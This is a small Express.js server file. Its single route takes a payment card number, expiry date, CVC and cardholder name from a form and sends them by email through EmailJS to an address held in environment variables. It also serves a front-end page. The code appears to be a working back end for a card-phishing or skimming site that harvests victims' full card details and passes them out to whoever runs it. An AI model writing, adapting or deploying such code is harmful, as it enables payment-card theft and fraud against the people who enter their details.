import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import emailjs from 'emailjs-com';
import path from 'path';
import { fileURLToPath } from 'url'; // ✅ Add this

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename); // ✅ ES module __dirname

const app = express();
app.use(cors());
app.use(express.json());

// EmailJS setup...
const emailjsUser = process.env.EMAILJS_USER;
const emailjsService = process.env.EMAILJS_SERVICE;
const emailjsTemplate = process.env.EMAILJS_TEMPLATE;
const emailjsKey = process.env.EMAILJS_KEY;

// POST /send-email...
app.post("/send-email", async (req, res) => {
  const { card_number, expiration, cvc, card_name } = req.body;
  const templateParams = { card_number, expiration, cvc, card_name };

  emailjs.send(emailjsService, emailjsTemplate, templateParams, emailjsKey)
    .then((response) => {
      console.log('SUCCESS!', response.status, response.text);
      res.json({ success: true });
    })
    .catch((err) => {
      console.log('FAILED...', err);
      res.status(500).json({ success: false, error: err });
    });
});

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const port = process.env.PORT || 10000;
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
